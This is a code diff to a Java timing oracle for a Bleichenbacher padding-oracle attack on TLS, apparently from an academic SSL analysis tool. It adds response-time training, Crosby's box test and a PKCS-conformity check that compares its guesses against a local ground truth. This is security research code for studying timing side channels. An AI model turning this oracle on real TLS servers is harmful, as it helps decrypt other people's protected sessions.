@@ -4,15 +4,26 @@
  */
 package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;
 
+import de.fau.pi1.timerReporter.dataset.Dataset;
+import de.fau.pi1.timerReporter.evaluation.StatisticEvaluation;
+import de.fau.pi1.timerReporter.plots.PlotPool;
+import de.fau.pi1.timerReporter.reader.ReaderCsv;
 import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
 import de.rub.nds.ssl.analyzer.removeMe.SSLServer;
+import de.fau.pi1.timerReporter.tools.Conf;
+import de.fau.pi1.timerReporter.tools.FileId;
+import de.fau.pi1.timerReporter.tools.Folder;
+import de.fau.pi1.timerReporter.writer.WritePDF;
+import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.net.SocketException;
 import java.security.*;
 import java.security.cert.CertificateException;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.logging.Level;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -122,6 +133,10 @@ public class TimingOracle extends ATimingOracle {
      * Protocol short name.
      */
     private String protocolShortName = "TLS";
+    private int boxLowPercentile = 10,
+            boxHighPercentile = 15,
+            amountOfMeasurements = 20;
+    private long validKeyHigh;
 
     /**
      * Constructor
@@ -142,6 +157,26 @@ public class TimingOracle extends ATimingOracle {
         cipher.init(Cipher.DECRYPT_MODE, privateKey);
     }
 
+    /**
+     * This method performs the statistical analysis of the timing measurements.
+     * It assumes that a valid key has a significantly lower response time than
+     * an invalid key. In a nutshell, the method performs Crosby's box test.
+     *
+     * @param testKey An array containing the list of measurements that were
+     * performed with the key to be tested
+     * @param validKey An array containing the list of measurements that were
+     * performed with a known-to-be-valid key
+     * @return
+     */
+    private boolean isDifferent(long[] testKey) {
+
+        Arrays.sort(testKey);
+
+        long testKeyLow = testKey[testKey.length * boxLowPercentile / 100];
+
+        return validKeyHigh < testKeyLow;
+    }
+
     @Override
     public void trainOracle(byte[] validRequest, byte[] invalidRequest)
             throws OracleException {
@@ -150,7 +185,7 @@ public class TimingOracle extends ATimingOracle {
             fw = new FileWriter("training_data.csv");
             long delay;
             // train the oracle using the executeWorkflow functionality
-            for (int i = 0; i < 10000; i += 2) {
+            for (int i = 0; i < 1000; i += 2) {
                 exectuteWorkflow(validRequest);
                 delay = getTimeDelay(getWorkflow().getTraceList());
                 fw.write(i + ";valid;" + delay + "\n");
@@ -158,9 +193,9 @@ public class TimingOracle extends ATimingOracle {
                 exectuteWorkflow(invalidRequest);
                 delay = getTimeDelay(getWorkflow().getTraceList());
                 fw.write(i + 1 + ";invalid;" + delay + "\n");
-                
+
                 fw.flush();
-                
+
                 System.out.println("doing " + i);
             }
         } catch (IOException ex) {
@@ -172,6 +207,80 @@ public class TimingOracle extends ATimingOracle {
                 java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
             }
         }
+        
+        Conf.put("inputFile", "training_data.csv");
+        Conf.put("gnuplot", "/usr/bin/gnuplot");
+        Conf.put("makeindexPath", "/usr/bin/makeindex");
+        Conf.put("pdflatex", "/usr/bin/pdflatex");
+        ReaderCsv reader = new ReaderCsv();
+        Dataset dataset = new Dataset(reader);
+        dataset.setName("New Measurement");
+        String report = de.fau.pi1.timerReporter.main.Main.getReport();
+
+        // create plot pool to multi threaded the plots
+        PlotPool plotPool = new PlotPool(report, dataset);
+
+        // plot the data set with the lower bound of 0.0 and the upper bound of 1.0
+        // plotPool.plot("Unfiltered Measurements", 0.0, 1.0);
+
+        // plot the data set with the user input lower bound and upper bound
+        // plotPool.plot("Filtered Measurments: User Input", new Double(0.2), new Double(0.3));
+
+        // build the evaluation phase
+        StatisticEvaluation statisticEvaluation = new StatisticEvaluation(dataset, plotPool);
+
+        /*
+         * this part shows how an optimal box is set by a user
+         */
+        /*double[] userInputOptimalBox = new double[2];
+         userInputOptimalBox[0] = new Double(0.19);
+         userInputOptimalBox[1] = new Double(0.21);
+         statisticEvaluation.setOptimalBox(userInputOptimalBox);*/
+
+        // Manually set the minimum amount of measurements
+        // statisticEvaluation.onlyValidationPhase(1000);
+
+        // Automatically determine minimum amount of measurements
+        statisticEvaluation.calibrationPhase();
+
+        // print the box test results into a csv file
+        statisticEvaluation.printBoxTestResults(new File(report + Folder.getFileSep() + FileId.getId() + "-" + "BoxTestResult.csv"));
+
+        /*
+         * this part shows the getter of the evaluation results
+         * 
+         for (BoxTestResults result : statisticEvaluation.getBoxTestResults()) {
+         System.out.println(result.getInputFile() + " [" + result.getSecretA().getName() + "<" + result.getSecretB().getName() + "]: " + result.getOptimalBox()[0] + "-" + result.getOptimalBox()[1]);
+
+         // iterate above all tested smallest sizes
+         for(int i = 0; i < result.getSmallestSize().size(); ++i) {
+         System.out.println("Minimum amouont of measurements: " + result.getSmallestSize().get(i) + "\nConfidence Interval: " + result.getConfidenceInterval().get(i));
+         System.out.println("Subset A overlaps: " + Folder.convertArrayListToString(result.getSubsetOverlapA().get(i)));
+         System.out.println("Subset B overlaps: " + Folder.convertArrayListToString(result.getSubsetOverlapB().get(i)));
+         System.out.println("Subset A and B significant different: " + Folder.convertArrayListToString(result.getSignificantDifferent().get(i)));
+
+         }
+         }
+         */
+
+        // store the time lines
+        ArrayList<String> timelineNames = statisticEvaluation.storeTimelines(report + Folder.getFileSep() + "images" + Folder.getFileSep());
+
+        // close the thread pool
+        plotPool.close();
+
+        // write results in html and pdf
+        // new WriteHTML(dataset, report, plotPool).write();
+
+        try {
+            new WritePDF(dataset, report, plotPool, timelineNames).write();
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.out.println("Error while writing the pdf.");
+        }
+
+        // delete the folder tmp
+        Folder.deleteTmp();
     }
 
     private static KeyStore loadKeyStore(final String keyStorePath,
@@ -221,18 +330,54 @@ public class TimingOracle extends ATimingOracle {
     public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
         boolean ret = false;
         try {
-            exectuteWorkflow(encPMS);
-            long delay = getTimeDelay(getWorkflow().getTraceList());
-            System.out.println("XXXXXXX Delay: " + delay);
+            boolean groundTruth = cheat(encPMS);
 
-    // TODO: remove when workflow is executed        
-    // numberOfQueries++;
-            //ret = cheat(encPMS);
-        } catch (Exception ex) {
+            long[] measurements = new long[amountOfMeasurements];
+            for (int i = 0; i < amountOfMeasurements; i++) {
+                exectuteWorkflow(encPMS);
+                measurements[i] = getTimeDelay(getWorkflow().getTraceList());
+            }
+            
+            boolean test = isDifferent(measurements);
+            if(groundTruth == false) {
+                if(test == false) {
+                    /*
+                     * all good!
+                     */
+                    ret = test;
+                } else {
+                    /*
+                     * The submitted key was invalid but our test predicted that the
+                     * key was valid. This is the worst case, because it will most
+                     * certainly break the subsequent computations. We will stop here.
+                     */
+                    System.err.println("ERROR: invalid key was predicted to be valid. Stopping.");
+                    java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, "ERROR: invalid key was predicted to be valid. Stopping.");
+                    System.exit(1);
+                }
+                
+            } else {
+                if(test == false) {
+                    /*
+                     * The submitted key was valid but our test predicted that the
+                     * key was invalid. This decreases the performance of the attack
+                     * but does not necessarily break subsequent computations.
+                     */
+                    System.err.println("ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
+                    java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.WARNING, "ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
+                    ret = test;
+                } else {
+                    /*
+                     * all good!
+                     */
+                    ret = test;
+                }
+            }
+
+        } catch (IllegalBlockSizeException ex) {
             java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
-            sslServer.shutdown();
-            sslServerThread.interrupt();
-            throw new OracleException("SSL", ex, LogLevel.FATAL);
+        } catch (BadPaddingException ex) {
+            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
         }
         return ret;
     }
@@ -251,7 +396,7 @@ public class TimingOracle extends ATimingOracle {
     }
 
     public static void main(String[] args) {
-        PropertyConfigurator.configure("logging.properties"); 
+        PropertyConfigurator.configure("logging.properties");
 
         try {
             String keyName = "2048_rsa";
@@ -268,10 +413,10 @@ public class TimingOracle extends ATimingOracle {
             byte[] plainPKCS_wrong = new byte[plainPKCS.length];
             System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
             plainPKCS_wrong[0] = 23;
-            
+
             byte[] encPMS = encryptHelper(plainPKCS, publicKey);
             byte[] encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
-            
+
             to.trainOracle(encPMS, encPMSWrong);
             System.exit(0);
 
